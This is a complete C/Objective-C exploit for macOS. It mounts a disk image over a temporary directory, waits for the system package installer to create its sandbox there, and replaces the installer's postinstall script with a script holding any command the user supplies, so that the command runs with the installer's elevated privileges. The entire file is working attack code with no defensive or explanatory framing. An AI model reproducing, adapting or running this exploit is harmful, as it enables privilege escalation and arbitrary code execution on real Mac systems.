#import <Foundation/Foundation.h>
#include <sys/stat.h>
#include <dirent.h>

#define MOUNT_DIR "/tmp/.exploit"
#define PAYLOAD_DIR MOUNT_DIR"/payload"
#define PAYLOAD_POST PAYLOAD_DIR"/postinstall"

void prepare(const char *payload) {
    printf("[*] preparing the dmg mounting...\n");
    mkdir(MOUNT_DIR, 0777);
    system("hdiutil create -size 50m -volname .exploit -ov disk.dmg");
    system("hdiutil attach disk.dmg -mountpoint "MOUNT_DIR);
    
    printf("[*] preparing the payload...\n");
    mkdir(PAYLOAD_DIR, 0777);
    FILE *fp = fopen(PAYLOAD_POST, "w");
    fwrite("#!/bin/sh\n", 10, 1, fp);
    fwrite(payload, strlen(payload), 1, fp);
    fclose(fp);
    chmod(PAYLOAD_POST, 0777);

    printf("[*] all the preparations are done.\n");
}

void cleanup(void) {
    unlink("disk.dmg");
    system("rm -rf "MOUNT_DIR);
}

// the payload scripts will be executed in the path like:
// $MOUNT_DIR/.PKInstallSandboxManager-SystemSoftware/2C3F8603-0D00-4AF2-9F4D-BE51119859F8.activeSandbox/OpenPath.ZTCpSY/Scripts/com.apple.pkg.macOSPublicBetaAccessUtility.16U2035.Z15tB7/postinstall

void fire_the_hole(void) {
    DIR *dp = NULL;
    struct dirent *ep = NULL;
    char *sandbox = NULL, *openpath = NULL, *pkgid = NULL;
    char path[MAXPATHLEN] = {0};
    
    while (1) {
        dp = opendir(MOUNT_DIR"/.PKInstallSandboxManager-SystemSoftware");
        if (NULL == dp) continue;
        while ((ep = readdir (dp))) {
            if (strlen(ep->d_name) == 0x32) { //strlen("2C3F8603-0D00-4AF2-9F4D-BE51119859F8.activeSandbox")==0x32
                sandbox = ep->d_name;
                printf("[*] Got Sandbox:%s.\n", sandbox);
                goto NEXT1;
            }
        }
        closedir (dp);
    }
NEXT1:
    snprintf(path, MAXPATHLEN, MOUNT_DIR"/.PKInstallSandboxManager-SystemSoftware/%s", sandbox);
    while (1) {
        dp = opendir(path);
        if (NULL == dp) continue;
        while ((ep = readdir (dp))) {
            if (strlen(ep->d_name) == 15) { //strlen("OpenPath.ZTCpSY")==15
                openpath = ep->d_name;
                printf("[*] Got OpenPath:%s.\n", openpath);
                goto NEXT2;
            }
        }
        closedir (dp);
    }
NEXT2:
    snprintf(path, MAXPATHLEN, MOUNT_DIR"/.PKInstallSandboxManager-SystemSoftware/%s/%s/Scripts", sandbox, openpath);
    while (1) {
        dp = opendir(path);
        if (NULL == dp) continue;
        while ((ep = readdir (dp))) {
            if (strlen(ep->d_name) > 8) { // length > 8, like: "pkgid.version_id.XXXXXX"
                pkgid = ep->d_name;
                printf("[*] Got pkgid:%s.\n", pkgid);
                goto NEXT3;
            }
        }
        closedir (dp);
    }
NEXT3:
    snprintf(path, MAXPATHLEN, MOUNT_DIR"/.PKInstallSandboxManager-SystemSoftware/%s/%s/Scripts/%s/postinstall", sandbox, openpath, pkgid);
    while (-1 == access(path, R_OK)) {
        //printf("[!] failed to access: %s, errno:%d, waiting...\n", path, errno);
    }

    unlink(path);
    rename(PAYLOAD_POST, path);
    
    printf("[*] exploit successfully :D\n");
}

int main(int argc, const char * argv[]) {
    if (argc != 2) {
        printf("Usage: %s any_payload_command_string\n", argv[0]);
    }
    
    prepare(argv[1]);
    fire_the_hole();
//    sleep(10);// wait for our payload being executed, then cleanup the mess
//    cleanup();
    
    return 0;
}
